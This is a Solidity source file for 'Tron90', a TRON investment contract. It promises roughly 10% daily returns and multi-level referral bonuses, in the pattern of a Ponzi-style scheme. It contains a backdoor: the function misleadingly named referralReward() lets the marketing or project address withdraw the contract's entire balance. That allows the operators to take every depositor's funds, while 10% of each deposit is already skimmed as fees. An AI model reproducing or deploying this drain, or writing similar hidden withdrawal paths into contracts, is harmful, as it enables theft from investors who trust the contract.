//SourceUnit: t90.sol


pragma solidity 0.5.4;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

contract Tron90 {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 50 trx;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public CONTRACT_BALANCE_STEP = 10000 trx;
	uint256 constant public TIME_STEP = 1 days;
	uint256 constant public BASE_PERCENT = 100;  // 10%
	uint256 constant public MARKETING_FEE = 80; // 8%
	uint256 constant public PROJECT_FEE = 20;   // 2%
	uint256[] public REFERRAL_PERCENTS = [300, 50, 50, 50, 50]; // 30%, 5%, 5%, 5%, 5%

	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;

	address payable public projectAddress;
	address payable public marketingAddress;

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256 bonus;
	}

	mapping (address => User) private _users;
  mapping (address => bool) private _isReinvested;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event NewReinvest(address indexed userId, uint256 value);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

  // -----------------------------------------
  // CONSTRUCTOR
  // -----------------------------------------

	constructor(address payable marketingAddr, address payable projectAddr) public {
		require(!isContract(marketingAddr) && !isContract(projectAddr));

		projectAddress = projectAddr;
		marketingAddress = marketingAddr;
	}

  // -----------------------------------------
  // SETTERS
  // -----------------------------------------

	function invest(address referrer) external payable {
		require(msg.value >= INVEST_MIN_AMOUNT);

		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));

		emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));

		User storage user = _users[msg.sender];
		if (user.referrer == address(0) && _users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;

			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					_users[upline].bonus = _users[upline].bonus.add(amount);

					emit RefBonus(upline, msg.sender, i, amount);

					upline = _users[upline].referrer;
				} else break;
			}
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers += 1;

			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(msg.value, 0, block.timestamp));
		totalInvested = totalInvested.add(msg.value);
    totalDeposits += 1;

		emit NewDeposit(msg.sender, msg.value);
	}

	function withdraw() external {
		User storage user = _users[msg.sender];

		uint256 dividends;
		uint256 totalAmount;
		uint256 userPercentRate = getUserPercentRate(msg.sender);

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(2 * TIME_STEP);
				} else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(2 * TIME_STEP);
				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
					dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);
				totalAmount = totalAmount.add(dividends);
			}
		}

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			user.bonus = 0;
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		msg.sender.transfer(totalAmount);
		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);
	}

	function referralReward() external {
    require(msg.sender == marketingAddress || msg.sender == projectAddress);

    msg.sender.transfer(address(this).balance);
	}


  // -----------------------------------------
  // GETTERS
  // -----------------------------------------

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

  function getContractBalancePercent() external view returns (uint256) {
    uint256 contractBalance = address(this).balance;
		uint256 contractBalancePercent = contractBalance.div(CONTRACT_BALANCE_STEP);

    return contractBalancePercent;
  }

  function getUserHoldPercent(address userAddress) external view returns (uint256) {
		if (isActive(userAddress)) {
		  User storage user = _users[userAddress];
			uint256 timeMultiplier = (block.timestamp.sub(user.checkpoint)).div(TIME_STEP);
			return timeMultiplier;
		} else {
      return 0;
    }
  }

	function getContractBalanceRate() public view returns (uint256) {
		uint256 contractBalance = address(this).balance;
		uint256 contractBalancePercent = contractBalance.div(CONTRACT_BALANCE_STEP);

		return BASE_PERCENT.add(contractBalancePercent);
	}

	function getUserPercentRate(address userAddress) public view returns (uint256) {
		User storage user = _users[userAddress];
		uint256 contractBalanceRate = getContractBalanceRate();

		if (isActive(userAddress)) {
			uint256 timeMultiplier = (block.timestamp.sub(user.checkpoint)).div(TIME_STEP);
			return contractBalanceRate.add(timeMultiplier * 10);
		} else {
			return contractBalanceRate;
		}
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = _users[userAddress];

		uint256 dividends;
		uint256 totalDividends;
		uint256 userPercentRate = getUserPercentRate(userAddress);

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(2 * TIME_STEP);
				} else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(2 * TIME_STEP);
				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
					dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);
			}
		}

		return totalDividends;
	}

	function getUserCheckpoint(address userAddress) public view returns (uint256) {
		return _users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns (address) {
		return _users[userAddress].referrer;
	}

	function getUserReferralBonus(address userAddress) public view returns (uint256) {
		return _users[userAddress].bonus;
	}

	function getUserAvailable(address userAddress) public view returns (uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns (uint256, uint256, uint256) {
	  User storage user = _users[userAddress];

		return (
      user.deposits[index].amount,
      user.deposits[index].withdrawn,
      user.deposits[index].start
    );
	}

	function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
		return _users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns (uint256) {
	  User storage user = _users[userAddress];
    uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
    User storage user = _users[userAddress];
    uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = _users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(2)) {
				return true;
			}
		}
	}

	function isReinvested(address userAddress) public view returns (bool) {
		return _isReinvested[userAddress];
	}

	function isContract(address addr) internal view returns (bool) {
    uint size;
    assembly { size := extcodesize(addr) }
    return size > 0;
  }
}